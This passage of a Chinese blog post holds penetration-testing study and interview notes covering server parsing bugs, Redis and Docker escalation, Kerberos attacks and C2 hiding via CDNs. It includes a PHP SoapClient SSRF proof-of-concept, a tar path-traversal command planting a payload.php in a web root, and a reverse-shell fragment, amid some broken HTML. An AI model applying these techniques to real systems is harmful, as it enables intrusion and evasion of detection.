<h2 id="Ngnix"><a href="#Ngnix" class="headerlink" title="Ngnix"></a>Ngnix</h2><h3 id="CGI漏洞"><a href="#CGI漏洞" class="headerlink" title="CGI漏洞(&lt;0.8.37)"></a>CGI漏洞(&lt;0.8.37)</h3><p>和 IIS 7.0&#x2F;7.5 一致</p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/Dv0UbKkPeoWXlUx6jJ0cEW5Anvc.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="00-空字节"><a href="#00-空字节" class="headerlink" title="%00 空字节"></a>%00 空字节</h3><p>Nginx 0.5.*</p>
<p>Nginx 0.6.*</p>
<p>Nginx 0.7 &lt;&#x3D; 0.7.65</p>
<p>Nginx 0.8 &lt;&#x3D; 0.8.37</p>
<p>xxx.php%00.jpg</p>
<h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><h3 id="文件名解析"><a href="#文件名解析" class="headerlink" title="文件名解析"></a>文件名解析</h3><p>从右到左，例如上传一个 xie.php.rar，无法识别 rar 会走到 php</p>
<h3 id="罕见后缀"><a href="#罕见后缀" class="headerlink" title="罕见后缀"></a>罕见后缀</h3><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/WX10b59fboQWbixYrtYcVfG1nLb.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/WeWEbB3xWojY1Qxt1oUchbdinSc.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>CVE-2021-42013</p>
<p>2e url编码路径穿越后文件包含，可以包含&#x2F;bin&#x2F;sh</p>
<p>若开启cgi-bin可以rce</p>
<h2 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h2><p>windows： xx.jpg[空格或.]会被默认删除，可绕过黑名单</p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/FHcRb7GQzoyOj4x05fxc6dAon7g.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="Redis-提权"><a href="#Redis-提权" class="headerlink" title="Redis 提权"></a>Redis 提权</h1><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/DYuWb0o8yocza9xZvffcxu82nye.png" srcset="/img/loading.gif" lazyload></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/h0cksr/p/16189728.html">渗透测试怎么利用 Redis 提权 - h0cksr - 博客园 (cnblogs.com)</a></p>
<p>默认端口 6379</p>
<h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>一.登录 redis</p>
<p>默认无密码与弱口令&#x2F;未授权访问</p>
<p>二.提权</p>
<p>1.写入 webshell</p>
<p>2.公私钥获取 root 权限</p>
<p>3.crontab 定时任务反弹 shell</p>
<ul>
<li>只有centos才可以： <strong>因为默认redis写⽂件后是644的权限</strong>，但ubuntu要求执⾏定时任务⽂件**&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;<username>权限必须是600<strong>也就是-rw———-才会执⾏，否则会报 错(root) INSECURE MODE (mode 0600 expected)，</strong>⽽Centos的定时任务⽂ 件&#x2F;var&#x2F;spool&#x2F;cron&#x2F;<username>权限644**</li>
<li>执⾏redis保存RDB会存在乱码，在Ubuntu上 会报错，⽽在Centos上不会报错 </li>
<li>然后由于系统的不同，crontrab定时⽂件位置也会不同</li>
</ul>
<p>4.主从复制 rce</p>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>更改端口</p>
<p>修改口令</p>
<p>绑定内网</p>
<p>开启保护模式</p>
<h1 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h1><h2 id="检查环境"><a href="#检查环境" class="headerlink" title="检查环境"></a>检查环境</h2><p>ls -al &#x2F; 寻找.dockerenv</p>
<p>cat &#x2F;proc&#x2F;1&#x2F;cgroup</p>
<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><h3 id="Docker-Remote-Api-未授权访问"><a href="#Docker-Remote-Api-未授权访问" class="headerlink" title="Docker Remote Api 未授权访问"></a>Docker Remote Api 未授权访问</h3><p>2375端口，特权模式拉取一个镜像后挂载宿主机进入一个新建的目录，然后目录中写一个sh文件反弹shell</p>
<h3 id="特权模式逃逸"><a href="#特权模式逃逸" class="headerlink" title="特权模式逃逸"></a>特权模式逃逸</h3><p>cat &#x2F;proc&#x2F;self&#x2F;status|grep Cap检查0000003fffffffff</p>
<p>同上挂载，还可以写计划任务，ssh公钥，chroot换目录</p>
<h3 id="危险挂载"><a href="#危险挂载" class="headerlink" title="危险挂载"></a>危险挂载</h3><h3 id="Docker-Socket挂载"><a href="#Docker-Socket挂载" class="headerlink" title="Docker Socket挂载"></a>Docker Socket挂载</h3><h3 id="宿主机procfs"><a href="#宿主机procfs" class="headerlink" title="宿主机procfs"></a>宿主机procfs</h3><h3 id="脏牛"><a href="#脏牛" class="headerlink" title="脏牛"></a>脏牛</h3><h3 id="runC"><a href="#runC" class="headerlink" title="runC"></a>runC</h3><h1 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h1><h2 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h2><p>21 ftp</p>
<p>22 ssh</p>
<p>23 telnet</p>
<p>25 smtp</p>
<p>101 pop3</p>
<p>135 rpc</p>
<p>139 445 SMB netbios MS170</p>
<p>389 LDAP协议</p>
<p>3389 远程桌⾯</p>
<p>5985 winrm</p>
<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>1433 MSSQL</p>
<p>1521 Oracle</p>
<p>3306 MySQL</p>
<p>5432 PostgreSQL</p>
<h2 id="web服务"><a href="#web服务" class="headerlink" title="web服务"></a>web服务</h2><p>80-89 web</p>
<p>8000-9090 web</p>
<h2 id="特殊服务"><a href="#特殊服务" class="headerlink" title="特殊服务"></a>特殊服务</h2><p>443 SSL⼼脏滴⾎</p>
<p>2601、2604 zebra路由，默认密码zebra</p>
<p>873 Rsync未授权</p>
<p>5984 CouchDB <a target="_blank" rel="noopener" href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a></p>
<p>6379 redis未授权</p>
<p>7001、7002 weblogic默认弱⼝令、反序列化</p>
<p>9200、9300 elasticsearch 参考乌云：多玩某服务器ElasticSearch命令执⾏漏洞</p>
<p>11211 memcache未授权访问</p>
<p>50000 SAP命令执⾏</p>
<p>50070、50030 hadoop默认端⼝未授权访问</p>
<h2 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h2><p>Microsoft-DS traffic : 445&#x2F;TCP 445&#x2F;<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=UDP&spm=1001.2101.3001.7020">UDP</a> </p>
<p>Kerberos : 88&#x2F;TCP 88&#x2F;UDP </p>
<p>LDAP ping : 389&#x2F;UDP </p>
<p>DNS : 53&#x2F;TCP 53&#x2F;UDP </p>
<p>NetBIOS的相关服务 ： 137&#x2F;TCP 137&#x2F;UDP 138&#x2F;UDP 139&#x2F;UDP 开放这些连续的端口，以便于通过防火墙来使用</p>
<h1 id="面试小问题"><a href="#面试小问题" class="headerlink" title="面试小问题"></a>面试小问题</h1><h2 id="域前置-CDN技术"><a href="#域前置-CDN技术" class="headerlink" title="域前置&#x2F;CDN技术"></a>域前置&#x2F;CDN技术</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41874930/article/details/109008708">利用CDN、域前置、重定向三种技术隐藏C2的区别_域前置与cdn区别-CSDN博客</a></p>
<h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>注册一个域名，将他的A记录解析到一个cloudflare域名（或者其他cdn平台）上，然后再把自己的域名再注册一个cdn服务</p>
<p>将自己的cdn的A记录解析让他可以解析到C2的ip上，受害机的流量就只看得见cdn的ip了</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm">通过CDN隐藏了自己真实的<span class="hljs-built_in">ip</span><br>需要一个不备案的域名 不限制https<br></code></pre></td></tr></table></figure>

<h3 id="域前置"><a href="#域前置" class="headerlink" title="域前置"></a>域前置</h3><p>同一个cdn下有两个域名，curl访问的时候取决于host头写的是哪个域名</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm">通过CDN解析的特性（hosts头）来隐藏了<span class="hljs-built_in">ip</span>和域名（除非你想分析hosts头）<br>基于https 可以利用高信誉域名（前提是和自己的<span class="hljs-built_in">ip</span>在同个cdn下）<br></code></pre></td></tr></table></figure>

<img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/1619186782_6082d45e9c3c5ec1d11fd.png!small" srcset="/img/loading.gif" lazyload class="" title="CleanShot 2021-04-23 at 22.06.16@2x.png">

<h2 id="vCenter渗透思路"><a href="#vCenter渗透思路" class="headerlink" title="vCenter渗透思路"></a>vCenter渗透思路</h2><p>1.查看版本：https :&#x2F;&#x2F;x.x.x.x&#x2F;sdk&#x2F;vimServiceVersions.xml 打cve拿webshell</p>
<p>2.寻找凭据后解密拿cookie</p>
<p>•Linux:<br>&#x2F;storage&#x2F;db&#x2F;vmware-vmdir&#x2F;data.mdb<br>•Windows<br>C:\ProgramData\VMware\vCenterServer\data\vmdird\data.mdb</p>
<p>3.获取机器hash或者密码</p>
<p>生成快照-vol&#x2F;Vmss2core内存分析</p>
<h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><p>hadoop，FTP，LDAP，docker，Redis，Jboos，Jenkins..</p>
<h2 id="站库分离怎么打？"><a href="#站库分离怎么打？" class="headerlink" title="站库分离怎么打？"></a>站库分离怎么打？</h2><p>立足点是web的时候常规打，翻找数据库配置文件</p>
<p>对于数据库</p>
<p>select * from information_schema.PROCESSLIST; </p>
<p>定位web端ipload_file(mysql&lt;5.7)读文件</p>
<p>MSSQL：host_name()    @@servername确认站库分离 尝试RCE</p>
<h2 id="KDC服务器"><a href="#KDC服务器" class="headerlink" title="KDC服务器"></a>KDC服务器</h2><p>启动到88,464</p>
<ol>
<li><p>用户名爆破</p>
</li>
<li><p>密码喷洒和密码爆破</p>
</li>
<li><p>Kerberoasting</p>
</li>
<li><p>ASRepRoasting</p>
</li>
<li><p>黄金票据和白银票据</p>
</li>
<li><p>MS14-068</p>
</li>
<li><p>非约束委派、约束委派、基于资源的约束委派</p>
</li>
<li><p>票据传递（ptt&#x2F;ptk&#x2F;ptc）</p>
</li>
<li><p>mimikatz加密降级攻击(万能钥匙)</p>
</li>
<li><p>使用恶意的kerberos证书做权限维持</p>
</li>
</ol>
<h2 id="psexec原理"><a href="#psexec原理" class="headerlink" title="psexec原理"></a>psexec原理</h2><p>连接SMB共享后上传恶意服务文件到共享目录，打开SCM创建恶意服务连接管道</p>
<h2 id="frp有哪些流量特征，如何进行隐藏？"><a href="#frp有哪些流量特征，如何进行隐藏？" class="headerlink" title="frp有哪些流量特征，如何进行隐藏？"></a>frp有哪些流量特征，如何进行隐藏？</h2><p><a target="_blank" rel="noopener" href="https://xie.infoq.cn/article/d6e190ea22c428a4e21b4f0d0">Frp流量隐匿对抗排查_内网渗透</a></p>
<p>如果没有做任何配置或者 tls_enable&#x3D;false，则 wireshark 抓取的流量就是纯明文的，很容易暴露</p>
<blockquote>
<p>frpc 在连接认证 frps 的时候，会进行三次握手，会把 frp 的版本信息发给 frps 进行认证，如果是用的一个没有改过的 Frp 那么这时候只要建立连接，很容易就会被安全设备捕获到</p>
</blockquote>
<p>打开 tls_enable 之后，流量就做了加密</p>
<blockquote>
<p>使用 tls_enable 加密后，首次连接会一个 0x17 的头部特征，并发送一个大小为 243 的数据包</p>
</blockquote>
<h2 id="ubuntu定时任务弹shell失败"><a href="#ubuntu定时任务弹shell失败" class="headerlink" title="ubuntu定时任务弹shell失败"></a>ubuntu定时任务弹shell失败</h2><p>ubuntu的&#x2F;bin&#x2F;sh指向的是sh</p>
<p>重新改软连接，或者写成 bash -c “bash -i &gt;&amp; ……”</p>
<h2 id="⽇志被删除如何处理"><a href="#⽇志被删除如何处理" class="headerlink" title="⽇志被删除如何处理"></a>⽇志被删除如何处理</h2><p>将⽂件 &#x2F;proc&#x2F;544&#x2F;fd&#x2F;7 拷⻉到 &#x2F;var&#x2F;log&#x2F;messages </p>
<p>执⾏命令： cp &#x2F;proc&#x2F;544&#x2F;fd&#x2F;7 &#x2F;var&#x2F;log&#x2F;messages </p>
<p>重新启动 rsyslog 服务即可恢复被误删除的⽇志⽂件</p>
<h2 id="为什么-aspx-木马权限比-asp-大？"><a href="#为什么-aspx-木马权限比-asp-大？" class="headerlink" title="为什么 aspx 木马权限比 asp 大？"></a><strong>为什么 aspx 木马权限比 asp 大？</strong></h2><p>aspx 使用的是.net 技术。IIS 中默认不支持，ASP 只是脚本语言而已。</p>
<p>入侵的时候 asp 的木马一般是 guest 权限而 APSX 的木马一般是 users 权限。</p>
<h2 id="代码执行、文件读取、命令执行函数有哪些？"><a href="#代码执行、文件读取、命令执行函数有哪些？" class="headerlink" title="代码执行、文件读取、命令执行函数有哪些？"></a><strong>代码执行、文件读取、命令执行函数有哪些？</strong></h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span>）代码执行：<br>eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function<br><span class="hljs-number">2</span>）文件读取：<br><span class="hljs-function"><span class="hljs-title">file_get_contents</span><span class="hljs-params">()</span></span>,<span class="hljs-built_in">highlight_file</span>(),<span class="hljs-built_in">fopen</span>(),<span class="hljs-built_in">readfile</span>(),<span class="hljs-built_in">fread</span>(),<span class="hljs-built_in">fgetss</span>(),<span class="hljs-built_in">fgets</span>(),<span class="hljs-built_in">parse_ini_file</span>(),<span class="hljs-built_in">show_source</span>(),<span class="hljs-built_in">file</span>()等<br><span class="hljs-number">3</span>)命令执行：<br><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">()</span></span>, <span class="hljs-built_in">exec</span>(), <span class="hljs-built_in">shell_exec</span>(), <span class="hljs-built_in">passthru</span>() ,<span class="hljs-built_in">pcntl_exec</span>(),<span class="hljs-built_in">popen</span>(),<span class="hljs-built_in">proc_open</span>()<br></code></pre></td></tr></table></figure>



<h2 id="提权为何选择可读写目录？不用带空格的目录？"><a href="#提权为何选择可读写目录？不用带空格的目录？" class="headerlink" title="提权为何选择可读写目录？不用带空格的目录？"></a><strong>提权为何选择可读写目录？不用带空格的目录？</strong></h2><p>因为 exp 执行多半需要空格界定参数</p>
<h2 id="token-和-refer-横向对比-谁安全等级高？"><a href="#token-和-refer-横向对比-谁安全等级高？" class="headerlink" title="token 和 refer 横向对比 谁安全等级高？"></a><strong>token 和 refer 横向对比 谁安全等级高？</strong></h2><p>token 安全等级更高</p>
<h2 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h2><p>基于SSL&#x2F;TLS协议，包含：</p>
<ul>
<li>公钥：加密数据</li>
<li>证书颁发机构 CA签名：保证证书真实性和信任</li>
<li>证书持有者信息：包含域名和组织信息</li>
</ul>
<h2 id="内存马怎么手工排查，不用工具，怎么手动杀内存马"><a href="#内存马怎么手工排查，不用工具，怎么手动杀内存马" class="headerlink" title="内存马怎么手工排查，不用工具，怎么手动杀内存马"></a><strong>内存马怎么手工排查，不用工具，怎么手动杀内存马</strong></h2><p>内存马如何排查：如果发现了一些内存 webshell 的痕迹，需要有一个排查的思路来进行跟踪和分析，也是根据各类型的原理，<br>1、如果是 jsp 注入，日志中排查可以 jsp 的访问请求。<br>2、如果是代码执行漏洞，排查中间件的 error.log,查看是否有可疑的报错，判断注入时间和方法。<br>3、根据业务使用的组件排查可能存在的 java 代码执行漏洞，spring 的 controller 了类型的话根据上报 webshell 的 url 查找日志，filter 或者 listener 类型，可能会有较多的 404 但是带有参数的请求。<br>杀马：<br>终止进程：如果确认某个进程是内存马，可以尝试终止该进程。在 Windows 系统中，可以通过任务管理器或者命令行工具 taskkill 来终止进程；在 Linux 系统中，可以通过命令行工具 kill 或者 pkill 来终止进程。<br>删除文件：如果进程终止后，还需要删除相关的文件，以防止内存马重新启动。在 Windows 系统中，可以直接删除相关文件；在 Linux 系统中，需要先终止进程，然后再删除文件。</p>
<h2 id="鱼叉和水坑"><a href="#鱼叉和水坑" class="headerlink" title="鱼叉和水坑"></a>鱼叉和水坑</h2><p>鱼叉攻击：指利用木马程序作为电子邮件的附件，发送到目标电脑上，诱导受害者去打开附件来感染木马</p>
<p>水坑攻击：分析攻击目标的上网活动规律，寻找攻击目标经常访问的网站的弱点，将网站攻破并植入恶意程序，等待目标访问</p>
<h2 id="企业安全"><a href="#企业安全" class="headerlink" title="企业安全"></a>企业安全</h2><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/YG16bcSjfo3kQmxRwypcYzSGnRe.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="CDN-1"><a href="#CDN-1" class="headerlink" title="CDN"></a>CDN</h2><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/HZT7bYxxUoqQSyxHy5YcVnhEnPd.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h2><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/VaXxbvwCJo7MKOxdskScW8lyn7d.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="IDS-IPS"><a href="#IDS-IPS" class="headerlink" title="IDS&#x2F;IPS"></a>IDS&#x2F;IPS</h2><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/JshRb4zXqoPfyZx0Y6wcjU8Fn9b.png" srcset="/img/loading.gif" lazyload></p>
<ul>
<li><p>加密通道</p>
</li>
<li><p>混淆编码</p>
</li>
<li><p>分割攻击</p>
</li>
<li><p>流量模仿</p>
</li>
</ul>
<h2 id="票据"><a href="#票据" class="headerlink" title="票据"></a>票据</h2><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/WbcnbABAFoOopxxCnlrclP9LnWh.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="常见内网ip"><a href="#常见内网ip" class="headerlink" title="常见内网ip"></a>常见内网ip</h2><p>10.0.0.0&#x2F;8<br>10.0.0.0 - 10.255.255.255<br>172.16.0.0&#x2F;12<br>172.16.0.0 - 172.31.255.255<br>192.168.0.0&#x2F;16<br>192.168.0.0 - 192.168.255.255</p>
<h2 id="登录口"><a href="#登录口" class="headerlink" title="登录口"></a>登录口</h2><ul>
<li>注入点与万能密码</li>
<li>不安全用户提示</li>
<li>源代码</li>
<li>验证码</li>
<li>暴力破解</li>
<li>逻辑漏洞</li>
</ul>
<h2 id="针对kerbores的攻击有哪些？"><a href="#针对kerbores的攻击有哪些？" class="headerlink" title="针对kerbores的攻击有哪些？"></a>针对kerbores的攻击有哪些？</h2><ul>
<li>⽤户名爆破</li>
<li>密码喷洒和密码爆破</li>
<li>Kerberoasting</li>
<li>ASRepRoasting</li>
<li>⻩⾦票据和⽩银票据</li>
<li>MS14-068</li>
<li>⾮约束委派、约束委派、基于资源的约束委派</li>
<li>票据传递（ptt&#x2F;ptk&#x2F;ptc）</li>
<li>mimikatz加密降级攻击(万能钥匙)</li>
<li>使⽤恶意的kerberos证书做权限维持</li>
</ul>
<h2 id="windows登陆成功失败"><a href="#windows登陆成功失败" class="headerlink" title="windows登陆成功失败"></a>windows登陆成功失败</h2><p>4624&#x2F;4625</p>
<h1 id="web-零散知识"><a href="#web-零散知识" class="headerlink" title="web 零散知识"></a>web 零散知识</h1><h2 id="php-源码泄露问题"><a href="#php-源码泄露问题" class="headerlink" title="php 源码泄露问题"></a>php 源码泄露问题</h2><p>PHP&lt;&#x3D;7.4.21 时通过 <code>php -S</code> 的 WEB 服务器存在源码泄露漏洞，可以将 PHP 文件作为静态文件直接输出源码</p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/FbbPbLpz4oqm3DxlkuJc4zJVnUc.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="tar-解压目录穿越"><a href="#tar-解压目录穿越" class="headerlink" title="tar 解压目录穿越"></a>tar 解压目录穿越</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wanmiqi/article/details/110202417">https://blog.csdn.net/wanmiqi/article/details/110202417</a></p>
</blockquote>
<p>在 python 或者 Unix 下，使用 tar 压缩的文件名如果存在目录穿越，那么解压后的文件也会造成穿越</p>
<p><strong>ar cPvf shell.tar ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;testupload&#x2F;payload.php</strong></p>
<h2 id="pickle-反序列化"><a href="#pickle-反序列化" class="headerlink" title="pickle 反序列化"></a>pickle 反序列化</h2><h2 id="yaml-反序列化"><a href="#yaml-反序列化" class="headerlink" title="yaml 反序列化"></a>yaml 反序列化</h2><h2 id="Phpsession-特性"><a href="#Phpsession-特性" class="headerlink" title="Phpsession 特性"></a>Phpsession 特性</h2><p><a target="_blank" rel="noopener" href="https://juejin.cn/post/7079670019956670471">PHP session 反序列化漏洞原理解析 - 掘金 (juejin.cn)</a></p>
<ol>
<li>利用 session 上传文件（配合文件上传）</li>
<li>由于 php 序列化处理器的不同导致的反序列化</li>
</ol>
<h2 id="CRLF-注入"><a href="#CRLF-注入" class="headerlink" title="CRLF 注入"></a>CRLF 注入</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/202762.html">每日漏洞 | CRLF 注入 - FreeBuf 网络安全行业门户</a></p>
</blockquote>
<p>利用换行符和回车符导致注入 http 数据</p>
<h2 id="Nodejs-Ssrf-拆分攻击"><a href="#Nodejs-Ssrf-拆分攻击" class="headerlink" title="Nodejs Ssrf 拆分攻击"></a>Nodejs Ssrf 拆分攻击</h2><p>利用的是 nodejs 对于特殊字符的转换导致不能正常过滤掉控制字符&#x2F;r&#x2F;n 导致的 CRLF 注入</p>
<h2 id="Soap-ssrf"><a href="#Soap-ssrf" class="headerlink" title="Soap ssrf"></a>Soap ssrf</h2><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/HJfEbVnLWoVRcGx2g4Cc8j5nnYg.png" srcset="/img/loading.gif" lazyload></p>
<p>结合 CRLF 注入：通过第二个参数控制 UA 间接可控制 content-type</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/80918004">SoapClient 反序列化 SSRF - 知乎 (zhihu.com)</a></p>
</blockquote>
<?php

$target = 'http://127.0.0.1:5555/path';

$post_string = 'data=something';

$headers = array

<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#x27;X-Forwarded-For: 127.0.0.1&#x27;,<br><br>&#x27;Cookie: PHPSESSID=my_session&#x27;<br><br>);<br></code></pre></td></tr></table></figure>

$b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'      => "aaab"));



$aaa = serialize($b);

$aaa = str_replace('^^',"\r\n",$aaa);

$aaa = str_replace('&','&',$aaa);

echo $aaa;



$c = unserialize($aaa);

$c->not_exists_function();

?>

<h2 id="Phar-反序列化"><a href="#Phar-反序列化" class="headerlink" title="Phar 反序列化"></a>Phar 反序列化</h2><p>同时存在文件上传和和一些触发 phar 协议的函数的时候可以强制触发反序列化</p>
<h2 id="自动注册类函数-spl-autoload-register"><a href="#自动注册类函数-spl-autoload-register" class="headerlink" title="自动注册类函数 spl_autoload_register"></a>自动注册类函数 spl_autoload_register</h2><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/ZOupbGWGUoZwV1x2DG5cXyTKnid.png" srcset="/img/loading.gif" lazyload></p>
<p>假如可以上传.inc 文件，同时存在反序列化，则将 webshell 修改为 inc 文件上传，记录上传的文件名，将他作序列化之后输入到反序列化的地方即 getshell</p>
<h2 id="Docker-PHP-裸文件本地包含"><a href="#Docker-PHP-裸文件本地包含" class="headerlink" title="Docker PHP 裸文件本地包含"></a>Docker PHP 裸文件本地包含</h2><p>只有文件包含但是无法上传文件，则需要利用本地文件</p>
<ol>
<li>日志包含：由于 Docker 将日志文件重定向，包含权限不足</li>
<li>Phpinfo 与条件竞争</li>
</ol>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/L2tUbrdnyo9QiTxKJTMc06mhnLc.png" srcset="/img/loading.gif" lazyload></p>
<p>我们需要获取文件名，同时需要条件竞争</p>
<ol>
<li>window 通配符</li>
<li>session.upload_progress</li>
<li>pearcmd.php<ol start="4">
<li></li>
</ol>
</li>
</ol>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/SGwYbK3Z2o4dbSxgByrc8j45nif.png" srcset="/img/loading.gif" lazyload></p>
<ol start="7">
<li></li>
</ol>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/SXVHbCgTuoXT3VxASFscTQv6nb2.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="DNS-域传送漏洞"><a href="#DNS-域传送漏洞" class="headerlink" title="DNS 域传送漏洞"></a>DNS 域传送漏洞</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1555532">https://cloud.tencent.com/developer/article/1555532</a></p>
</blockquote>
<p>DNS 备份服务器通过”域传送”从主服务器上复制数据，如果域传送被攻击者利用就会导致整个网络拓扑泄露，一般使用 privateDNS 防御（内外网分离），限制区域传送 ip 并且设置 TSIG key</p>
<p>利用：nslookup -type&#x3D;ns 域名</p>
<p>然后进入交互模式 ls 列出域名–&gt; 是否可以列出域</p>
<p>kali 下 dig 发送 axfr 请求，要求返回某个区域全部记录 dnsenum dnswalk 都可以</p>
<h2 id="未设置-spf-导致邮箱任意伪造"><a href="#未设置-spf-导致邮箱任意伪造" class="headerlink" title="未设置 spf 导致邮箱任意伪造"></a>未设置 spf 导致邮箱任意伪造</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wkzb/p/15401932.html">https://www.cnblogs.com/wkzb/p/15401932.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wkzb/p/15553178.html">https://www.cnblogs.com/wkzb/p/15553178.html</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/tOOBZ1aC6SsjslCM70WKBQ">https://mp.weixin.qq.com/s/tOOBZ1aC6SsjslCM70WKBQ</a> 邮件伪造</p>
</blockquote>
<h3 id="SPF"><a href="#SPF" class="headerlink" title="SPF"></a>SPF</h3><p>Sender Policy Framework 简单来说就是通过修改 SPF 记录来导致邮件任意发送</p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/Yz88bpKUBoiogBxG54WcIAA4n07.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="查看方式"><a href="#查看方式" class="headerlink" title="查看方式"></a>查看方式</h4><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/W8rubjDC8op8f7xYngNcAkgFn19.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/RMunbmJG5o06lsx4MhfcUmfinmd.png" srcset="/img/loading.gif" lazyload></p>
<p>SPF 显然有其局限性，当用户 A 发邮件给 B，B 再转发给 C 的时候，SPF 将邮件的发件人转换为 B，这个时候就产生了 DKIM 技术</p>
<h3 id="DKIM"><a href="#DKIM" class="headerlink" title="DKIM"></a>DKIM</h3><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/NJ2Ib4fFqok4wXxSXEVcipkcnEe.png" srcset="/img/loading.gif" lazyload></p>
<p>利用了公开密钥提供了身份验证和数字签名功能防止伪造篡改。</p>
<h4 id="查看方式-1"><a href="#查看方式-1" class="headerlink" title="查看方式"></a>查看方式</h4><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/YyCIbMQQEoMKQfxXRl0cT7Kcnyd.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h4><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/AQVWbiG1YoPy1AxHXyxcBE0snJf.png" srcset="/img/loading.gif" lazyload></p>
<p>说实话看的不是很明白</p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/MUISbyRGeoUEZBxa0TLc7HKOnkc.png" srcset="/img/loading.gif" lazyload></p>
<h1 id=""><a href="#" class="headerlink" title=""></a></h1>
                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>web知识</div>
      <div>http://example.com/2024/09/16/web知识/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>z2zQAQ</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年9月16日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
